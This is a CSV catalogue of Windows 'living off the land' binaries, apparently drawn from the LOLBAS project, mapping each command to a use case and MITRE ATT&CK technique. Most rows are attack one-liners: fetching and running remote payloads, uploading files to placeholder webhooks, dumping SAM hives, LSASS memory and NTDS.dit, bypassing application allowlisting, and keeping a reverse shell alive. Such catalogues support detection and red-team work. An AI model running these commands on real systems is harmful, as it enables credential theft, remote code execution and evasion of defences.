Command,Name,Description,Usecase,Category,MitreID
HH.exe http://some.url/script.ps1,Hh.exe,Open the target PowerShell script with HTML Help.,Download files from url,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml
HH.exe c:\windows\system32\calc.exe,Hh.exe,Executes calc.exe with HTML Help.,Execute process with HH.exe,Execute,T1218.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml
ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://webhook.site/xxxxxxxxx?encodedfile,ConfigSecurityPolicy.exe,Upload file. credentials or data exfiltration in general,Upload file,Upload,T1567,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml
ConfigSecurityPolicy.exe https://example.com/payload,ConfigSecurityPolicy.exe,It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE),Downloads payload from remote server,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml
InfDefaultInstall.exe Infdefaultinstall.inf,Infdefaultinstall.exe,Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.,Code execution,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml
reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ads\file.txt:evilreg.reg,Reg.exe,Export the target Registry key and save it to the specified .REG file within an Alternate data stream.,Hide/plant registry information in Alternate data stream for later use,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Reg.yml
reg save HKLM\SECURITY c:\test\security.bak && reg save HKLM\SYSTEM c:\test\system.bak && reg save HKLM\SAM c:\test\sam.bak,Reg.exe,Dump registry hives (SAM. SYSTEM. SECURITY) to retrieve password hashes and key material,Dump credentials from the Security Account Manager (SAM),Credentials,T1003.002,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Reg.yml
Msconfig.exe -5,Msconfig.exe,Executes command embeded in crafted c:\windows\system32\mscfgtlc.xml.,Code execution using Msconfig.exe,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msconfig.yml
conhost.exe calc.exe,Conhost.exe,Execute calc.exe with conhost.exe as parent process,Use conhost.exe as a proxy binary to evade defensive counter-measures,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Conhost.yml
conhost.exe --headless calc.exe,Conhost.exe,Execute calc.exe with conhost.exe as parent process,Specify --headless parameter to hide child process window (if applicable),Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Conhost.yml
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr,Desktopimgdownldr.exe,Downloads the file and sets it as the computer's lockscreen,Download arbitrary files from a web server,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml
ie4uinit.exe -BaseSettings,Ie4uinit.exe,Executes commands from a specially prepared ie4uinit.inf file.,Get code execution by copy files to another location,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ie4uinit.yml
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE,Msdt.exe,Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.,Execute code,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msdt.yml
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE,Msdt.exe,Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.,Execute code bypass Application whitelisting,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msdt.yml
msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe",Msdt.exe,Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the "PCWDiagnostic" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.,Execute code bypass Application allowlisting,AWL Bypass,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msdt.yml
DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile,DataSvcUtil.exe,Upload file. credentials or data exfiltration in general,Upload file,Upload,T1567,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml
regini.exe newfile.txt:hidden.ini,Regini.exe,Write registry keys from data inside the Alternate data stream.,Write to registry,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regini.yml
cscript //e:vbscript c:\ads\file.txt:script.vbs,Cscript.exe,Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS).,Can be used to evade defensive countermeasures or to hide as a persistence mechanism,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cscript.yml
WorkFolders,WorkFolders.exe,Execute control.exe in the current working directory,Can be used to evade defensive countermeasures or to hide as a persistence mechanism,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/WorkFolders.yml
finger user@example.host.com | more +2 | cmd,Finger.exe,Downloads payload from remote Finger server. This example connects to "example.host.com" asking for user "user"; the result could contain malicious shellcode which is executed by the cmd process.,Download malicious payload,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml
C:\Windows\System32\at.exe at 09:00 /interactive /every:m*t*w*th*f*s*su C:\Windows\System32\revshell.exe,At.exe,Create a recurring task to execute every day at a specific time.,Create a recurring task. to eg. to keep reverse shell session(s) alive,Execute,T1053.002,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/At.yml
replace.exe C:\Source\File.cab C:\Destination /A,Replace.exe,Copy file.cab to destination,Copy files,Copy,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml
replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A,Replace.exe,Download/Copy bar.exe to outdir,Download file,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml
ieexec.exe http://x.x.x.x:8080/bypass.exe,Ieexec.exe,Downloads and executes bypass.exe from the remote server.,Download and run attacker code from remote location,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ieexec.yml
ieexec.exe http://x.x.x.x:8080/bypass.exe,Ieexec.exe,Downloads and executes bypass.exe from the remote server.,Download and run attacker code from remote location,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ieexec.yml
cmdkey /list,Cmdkey.exe,List cached credentials,Get credential information from host,Credentials,T1078,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmdkey.yml
rundll32.exe dfshim.dll*ShOpenVerbApplication http://www.domain.com/application/?param1=foo,Dfsvc.exe,Executes click-once-application from Url (trampoline for Dfsvc.exe. DotNet ClickOnce host),Use binary to bypass Application whitelisting,AWL Bypass,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dfsvc.yml
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,Regsvr32.exe,Execute the specified remote .SCT script with scrobj.dll.,Execute code from remote scriptlet. bypass Application whitelisting,AWL Bypass,T1218.010,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml
regsvr32.exe /s /u /i:file.sct scrobj.dll,Regsvr32.exe,Execute the specified local .SCT script with scrobj.dll.,Execute code from scriptlet. bypass Application whitelisting,AWL Bypass,T1218.010,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,Regsvr32.exe,Execute the specified remote .SCT script with scrobj.dll.,Execute code from remote scriptlet. bypass Application whitelisting,Execute,T1218.010,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml
regsvr32.exe /s /u /i:file.sct scrobj.dll,Regsvr32.exe,Execute the specified local .SCT script with scrobj.dll.,Execute code from scriptlet. bypass Application whitelisting,Execute,T1218.010,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml
te.exe bypass.wsc,te.exe,Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file.,Execute Visual Basic script stored in local Windows Script Component file.,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Te.yml
wfc.exe c:\path\to\test.xoml,Wfc.exe,Execute arbitrary C# code embedded in a XOML file.,Execute proxied payload with Microsoft signed binary to bypass WDAC policies,AWL Bypass,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wfc.yml
SQLToolsPS.exe -noprofile -command Start-Process calc.exe,SQLToolsPS.exe,Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.,Execute PowerShell command.,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqltoolsps.yml
procdump.exe -md calc.dll explorer.exe,Procdump.exe,Loads calc.dll where DLL is configured with a 'MiniDumpCallbackRoutine' exported function. Valid process must be provided as dump still created.,Performs execution of unsigned DLL.,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Procdump.yml
procdump.exe -md calc.dll foobar,Procdump.exe,Loads calc.dll where configured with DLL_PROCESS_ATTACH execution. process argument can be arbitrary.,Performs execution of unsigned DLL.,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Procdump.yml
DumpMinitool.exe --file c:\users\mr.d0x\dump.txt --processId 1132 --dumpType Full,DumpMinitool.exe,Creates a memory dump of the lsass process,Create memory dump and parse it offline,Dump,T1003.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/DumpMinitool.yml
createdump.exe -n -f dump.dmp [PID],Createdump.exe,Dump process by PID and create a minidump file. If "-f dump.dmp" is not specified. the file is created as '%TEMP%\dump.%p.dmp' where %p is the PID of the target process.,Dump process memory contents using PID.,Dump,T1003,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Createdump.yml
Powerpnt.exe "http://192.168.1.10/TeamsAddinLoader.dll",Powerpnt.exe,Downloads payload from remote server,It will download a remote payload and place it in the cache folder,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Powerpnt.yml
fsi.exe c:\path\to\test.fsscript,Fsi.exe,Execute F# code via script file,Execute payload with Microsoft signed binary to bypass WDAC policies,AWL Bypass,T1059,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Fsi.yml
fsi.exe,Fsi.exe,Execute F# code via interactive command line,Execute payload with Microsoft signed binary to bypass WDAC policies,AWL Bypass,T1059,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Fsi.yml
Dxcap.exe -c C:\Windows\System32\notepad.exe,Dxcap.exe,Launch notepad as a subprocess of Dxcap.exe,Local execution of a process as a subprocess of Dxcap.exe,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dxcap.yml
sqldumper.exe 464 0 0x0110,Sqldumper.exe,Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).,Dump process using PID.,Dump,T1003,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqldumper.yml
sqldumper.exe 540 0 0x01100:40,Sqldumper.exe,0x01100:40 flag will create a Mimikatz compatible dump file.,Dump LSASS.exe to Mimikatz compatible dump using PID.,Dump,T1003.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqldumper.yml
AccCheckConsole.exe -window "Untitled - Notepad" C:\path\to\your\lolbas.dll,AccCheckConsole.exe,Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.,Local execution of managed code from assembly DLL.,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/AccCheckConsole.yml
AccCheckConsole.exe -window "Untitled - Notepad" C:\path\to\your\lolbas.dll,AccCheckConsole.exe,Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.,Local execution of managed code to bypass AppLocker.,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/AccCheckConsole.yml
rcsi.exe bypass.csx,rcsi.exe,Use embedded C# within the csx script to execute the code.,Local execution of arbitrary C# code stored in local CSX file.,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Rcsi.yml
rcsi.exe bypass.csx,rcsi.exe,Use embedded C# within the csx script to execute the code.,Local execution of arbitrary C# code stored in local CSX file.,AWL Bypass,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Rcsi.yml
vsls-agent.exe --agentExtensionPath c:\path\to\payload.dll,vsls-agent.exe,Load a library payload using the --agentExtensionPath parameter (32-bit),Execute proxied payload with Microsoft signed binary,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/vsls-agent.yml
squirrel.exe --download [url to package],Squirrel.exe,The above binary will go to url and look for RELEASES file and download the nuget package.,Download binary,Download,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Squirrel.yml
squirrel.exe --update [url to package],Squirrel.exe,The above binary will go to url and look for RELEASES file. download and install the nuget package.,Download and execute binary,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Squirrel.yml
squirrel.exe --update [url to package],Squirrel.exe,The above binary will go to url and look for RELEASES file. download and install the nuget package.,Download and execute binary,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Squirrel.yml
squirrel.exe --updateRoolback=[url to package],Squirrel.exe,The above binary will go to url and look for RELEASES file. download and install the nuget package.,Download and execute binary,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Squirrel.yml
squirrel.exe --updateRollback=[url to package],Squirrel.exe,The above binary will go to url and look for RELEASES file. download and install the nuget package.,Download and execute binary,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Squirrel.yml
Mftrace.exe cmd.exe,Mftrace.exe,Launch cmd.exe as a subprocess of Mftrace.exe.,Local execution of cmd.exe as a subprocess of Mftrace.exe.,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mftrace.yml
Mftrace.exe powershell.exe,Mftrace.exe,Launch cmd.exe as a subprocess of Mftrace.exe.,Local execution of powershell.exe as a subprocess of Mftrace.exe.,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mftrace.yml
VSIISExeLauncher.exe -p [PATH_TO_BIN] -a "argument here",VSIISExeLauncher.exe,The above binary will execute other binary.,Execute any binary with given arguments.,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/VSIISExeLauncher.yml
csi.exe file,csi.exe,Use csi.exe to run unsigned C# code.,Local execution of unsigned C# code.,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Csi.yml
Remote.exe /s "powershell.exe" anythinghere,Remote.exe,Spawns powershell as a child process of remote.exe,Executes a process under a trusted Microsoft signed binary,AWL Bypass,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Remote.yml
Remote.exe /s "powershell.exe" anythinghere,Remote.exe,Spawns powershell as a child process of remote.exe,Executes a process under a trusted Microsoft signed binary,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Remote.yml
Remote.exe /s "\\10.10.10.30\binaries\file.exe" anythinghere,Remote.exe,Run a remote file,Executing a remote binary without saving file to disk,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Remote.yml
coregen.exe /L C:\folder\evil.dll dummy_assembly_name,coregen.exe,Loads the target .DLL in arbitrary path specified with /L.,Execute DLL code,Execute,T1055,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Coregen.yml
coregen.exe dummy_assembly_name,coregen.exe,Loads the coreclr.dll in the corgen.exe directory (e.g. C:\Program Files\Microsoft Silverlight\5.1.50918.0).,Execute DLL code,Execute,T1055,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Coregen.yml
coregen.exe /L C:\folder\evil.dll dummy_assembly_name,coregen.exe,Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions.,Execute DLL code,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Coregen.yml
msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="c:\temp\calc.bat",Msdeploy.exe,Launch calc.bat via msdeploy.exe.,Local execution of batch file using msdeploy.exe.,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msdeploy.yml
msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="c:\temp\calc.bat",Msdeploy.exe,Launch calc.bat via msdeploy.exe.,Local execution of batch file using msdeploy.exe.,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msdeploy.yml
ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q,ntdsutil.exe,Dump NTDS.dit into folder,Dumping of Active Directory NTDS.dit database,Dump,T1003.003,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Ntdsutil.yml
winword.exe "http://192.168.1.10/TeamsAddinLoader.dll",Winword.exe,Downloads payload from remote server,It will download a remote payload and place it in the cache folder,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Winword.yml
Microsoft.NodejsTools.PressAnyKey.exe normal 1 cmd.exe,Microsoft.NodejsTools.PressAnyKey.exe,Launch cmd.exe as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe.,Spawn a new process via Microsoft.NodejsTools.PressAnyKey.exe.,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Microsoft.NodejsTools.PressAnyKey.yml
ProtocolHandler.exe https://example.com/payload,ProtocolHandler.exe,Downloads payload from remote server,It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE),Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/ProtocolHandler.yml
Sqlps.exe -noprofile,Sqlps.exe,Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.,Execute PowerShell commands without ScriptBlock logging.,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqlps.yml
MsoHtmEd.exe https://example.com/payload,MsoHtmEd.exe,Downloads payload from remote server,It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE),Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/MsoHtmEd.yml
dnx.exe consoleapp,dnx.exe,Execute C# code located in the consoleapp folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies),Local execution of C# project stored in consoleapp folder.,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dnx.yml
VisualUiaVerifyNative.exe,VisualUiaVerifyNative.exe,Generate Serialized gadget and save to - C:\Users\[current user]\AppData\Roaminguiverify.config before executing.,Execute proxied payload with Microsoft signed binary to bypass WDAC policies,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/VisualUiaVerifyNative.yml
mspub.exe https://example.com/payload,Mspub.exe,Downloads payload from remote server,It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE),Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mspub.yml
bginfo.exe bginfo.bgi /popup /nolicprompt,Bginfo.exe,Execute VBscript code that is referenced within the bginfo.bgi file.,Local execution of VBScript,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml
bginfo.exe bginfo.bgi /popup /nolicprompt,Bginfo.exe,Execute VBscript code that is referenced within the bginfo.bgi file.,Local execution of VBScript,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml
\\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt,Bginfo.exe,Execute bginfo.exe from a WebDAV server.,Remote execution of VBScript,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml
\\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt,Bginfo.exe,Execute bginfo.exe from a WebDAV server.,Remote execution of VBScript,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml
\\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt,Bginfo.exe,This style of execution may not longer work due to patch.,Remote execution of VBScript,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml
\\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt,Bginfo.exe,This style of execution may not longer work due to patch.,Remote execution of VBScript,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml
msxsl.exe customers.xml script.xsl,msxsl.exe,Run COM Scriptlet code within the script.xsl file (local).,Local execution of script stored in XSL file.,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msxsl.yml
msxsl.exe customers.xml script.xsl,msxsl.exe,Run COM Scriptlet code within the script.xsl file (local).,Local execution of script stored in XSL file.,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msxsl.yml
msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml,msxsl.exe,Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).,Local execution of remote script stored in XSL script stored as an XML file.,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msxsl.yml
msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml,msxsl.exe,Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).,Local execution of remote script stored in XSL script stored as an XML file.,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msxsl.yml
devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] "argument here" test,Devtoolslauncher.exe,The above binary will execute other binary.,Execute any binary with given arguments and it will call developertoolssvc.exe. developertoolssvc is actually executing the binary. https://i.imgur.com/Go7rc0I.png,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Devtoolslauncher.yml
devtoolslauncher.exe LaunchForDebug [PATH_TO_BIN] "argument here" test,Devtoolslauncher.exe,The above binary will execute other binary.,Execute any binary with given arguments.,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Devtoolslauncher.yml
fsianycpu.exe c:\path\to\test.fsscript,FsiAnyCpu.exe,Execute F# code via script file,Execute payload with Microsoft signed binary to bypass WDAC policies,AWL Bypass,T1059,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/FsiAnyCpu.yml
fsianycpu.exe,FsiAnyCpu.exe,Execute F# code via interactive command line,Execute payload with Microsoft signed binary to bypass WDAC policies,AWL Bypass,T1059,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/FsiAnyCpu.yml
dotnet.exe [PATH_TO_DLL],Dotnet.exe,dotnet.exe will execute any dll even if applocker is enabled.,Execute code bypassing AWL,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dotnet.yml
dotnet.exe [PATH_TO_DLL],Dotnet.exe,dotnet.exe will execute any DLL.,Execute DLL,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dotnet.yml
dotnet.exe fsi,Dotnet.exe,dotnet.exe will open a console which allows for the execution of arbitrary F# commands,Execute arbitrary F# code,Execute,T1059,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dotnet.yml
dotnet.exe msbuild [Path_TO_XML_CSPROJ],Dotnet.exe,dotnet.exe with msbuild (SDK Version) will execute unsigned code,Execute code bypassing AWL,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dotnet.yml
AppVLP.exe \\webdav\calc.bat,Appvlp.exe,Executes calc.bat through AppVLP.exe,Execution of BAT file hosted on Webdav server.,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml
AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe'*''* ''* 'open'* 1)",Appvlp.exe,Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.,Local execution of process bypassing Attack Surface Reduction (ASR).,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml
AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')",Appvlp.exe,Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.,Local execution of process bypassing Attack Surface Reduction (ASR).,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml
cdb.exe -cf x64_calc.wds -o notepad.exe,Cdb.exe,Launch 64-bit shellcode from the x64_calc.wds file using cdb.exe.,Local execution of assembly shellcode.,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Cdb.yml
cdb.exe -pd -pn <process_name>
.shell <cmd>
,Cdb.exe,Attaching to any process and executing shell commands.,Run a shell command under a trusted Microsoft signed binary,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Cdb.yml
